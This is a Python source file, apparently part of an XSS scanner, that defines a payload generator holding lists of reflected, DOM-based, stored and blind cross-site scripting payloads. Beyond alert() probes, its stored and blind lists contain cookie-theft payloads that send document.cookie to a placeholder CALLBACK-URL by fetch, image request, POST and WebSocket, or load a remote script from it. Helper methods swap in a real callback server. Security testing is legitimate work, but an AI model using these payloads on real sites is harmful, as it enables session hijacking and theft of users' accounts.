#!/usr/bin/env python3
"""
Payload Generator for XSS (Cross-Site Scripting) Scanner
"""


class XSSPayloadGenerator:
    def __init__(self):
        self.reflected_payloads = []
        self.dom_based_payloads = []
        self.stored_payloads = []
        self.blind_payloads = []

        self._init_payloads()

    def _init_payloads(self):
        """Initialize the payload lists with common XSS payloads"""

        # Basic XSS payloads
        self.reflected_payloads = [
            # Simple alerts
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "';alert(1);//",
            "\";alert(1);//",

            # Script tag variations
            "<script>prompt(1)</script>",
            "<script>confirm(1)</script>",
            "<ScRiPt>alert(1)</sCriPt>",

            # Event handlers
            "<img src=x onerror=alert(1)>",
            "<body onload=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe onload=alert(1)>",

            # Javascript URI
            "<a href='javascript:alert(1)'>XSS</a>",

            # Entities
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",

            # Bypass sanitizers
            "<img src=1 onerror=alert(1)>",
            "<img src=x onerror='alert(1)'>",
            "<script>console.log(1)</script>",

            # JS injection
            "'-alert(1)-'",
            "\"-alert(1)-\"",
            "</script><script>alert(1)</script>",

            # Nested quotes
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",

            # XSS with HTML entities
            "&lt;script&gt;alert(1)&lt;/script&gt;",

            # Common bypasses for WAFs and filters
            "<script>alert`1`</script>",
            "<script>eval(atob('YWxlcnQoMSk='))</script>"
        ]

        # DOM-based XSS payloads
        self.dom_based_payloads = [
            # Common DOM-based vectors
            "<img src=x onerror=alert(document.cookie)>",
            "<img src=x onerror=alert(document.domain)>",
            "<svg onload=eval(location.hash.slice(1))>",
            "'><img src=x onerror=alert(document.domain)>",
            "javascript:alert(document.domain)",
            "#<img src=/ onerror=alert(1)>",

            # Hash injection
            "#<script>alert(1)</script>",
            "#javascript:alert(1)",

            # DOM jQuery
            "<div id=\"\"><img src=x onerror=alert(1)></div>",

            # innerHTML triggers
            "<img src=x onerror=alert(1)>",
            "'><img src=x onerror=alert(document.cookie)><'"
        ]

        # Payloads for stored XSS testing
        self.stored_payloads = [
            # Long-term persistent payloads
            "<script>fetch('https://CALLBACK-URL?cookie='+encodeURIComponent(document.cookie))</script>",
            "<script>new Image().src='https://CALLBACK-URL?cookie='+encodeURIComponent(document.cookie)</script>",
            "<img src=x onerror=\"fetch('https://CALLBACK-URL?cookie='+encodeURIComponent(document.cookie))\">",

            # Stored payloads with console behavior
            "<script>console.error('XSS')</script>",
            "<script>console.log(document.cookie)</script>",

            # Stored content manipulations
            "<script>document.body.style.background='red'</script>",
            "<style>body{background:black !important;color:red !important;}</style>"
        ]

        # Payloads for blind XSS testing
        self.blind_payloads = [
            # Callback URL based (replace CALLBACK-URL with your server)
            "<script src='https://CALLBACK-URL/UNIQUE-ID'></script>",
            "<img src=x onerror='fetch(\"https://CALLBACK-URL/UNIQUE-ID?cookie=\"+document.cookie)'>",
            "<script>new Image().src='https://CALLBACK-URL/UNIQUE-ID?cookie='+document.cookie</script>",
            "<script>fetch('https://CALLBACK-URL/UNIQUE-ID',{method:'POST',body:document.cookie})</script>",

            # Websocket based
            "<script>var ws=new WebSocket('wss://CALLBACK-URL');ws.onopen=function(){ws.send(document.cookie)}</script>"
        ]

    def get_all_payloads(self):
        """
        Get all XSS payloads

        Returns:
            list: Combined list of all XSS payloads
        """
        all_payloads = []
        all_payloads.extend(self.reflected_payloads)
        all_payloads.extend(self.dom_based_payloads)

        # Remove duplicates
        unique_payloads = []
        for payload in all_payloads:
            if payload not in unique_payloads:
                unique_payloads.append(payload)

        return unique_payloads

    def get_reflected_payloads(self):
        """Get reflected XSS payloads"""
        return self.reflected_payloads

    def get_dom_based_payloads(self):
        """Get DOM-based XSS payloads"""
        return self.dom_based_payloads

    def get_stored_payloads(self, callback_url=None):
        """
        Get stored XSS payloads, optionally with a callback URL

        Args:
            callback_url (str): URL for exfiltration in stored payloads

        Returns:
            list: Stored XSS payloads
        """
        if not callback_url:
            return self.stored_payloads

        # Replace CALLBACK-URL with actual callback URL
        customized_payloads = []
        for payload in self.stored_payloads:
            customized_payloads.append(
                payload.replace('CALLBACK-URL', callback_url))

        return customized_payloads

    def get_blind_payloads(self, callback_url=None, unique_id=None):
        """
        Get blind XSS payloads, optionally with a callback URL

        Args:
            callback_url (str): URL for exfiltration in blind payloads
            unique_id (str): Unique identifier for tracking

        Returns:
            list: Blind XSS payloads
        """
        if not callback_url:
            return self.blind_payloads

        # Replace CALLBACK-URL with actual callback URL and unique ID
        customized_payloads = []
        for payload in self.blind_payloads:
            modified = payload.replace('CALLBACK-URL', callback_url)
            if unique_id:
                modified = modified.replace('UNIQUE-ID', unique_id)
            customized_payloads.append(modified)

        return customized_payloads

    def generate_custom_payloads(self, template, values):
        """
        Generate custom payloads by substituting values into a template

        Args:
            template (str): Template with placeholders {}
            values (list): List of values to substitute

        Returns:
            list: List of customized payloads
        """
        custom_payloads = []

        for value in values:
            custom_payload = template.format(value)
            custom_payloads.append(custom_payload)

        return custom_payloads
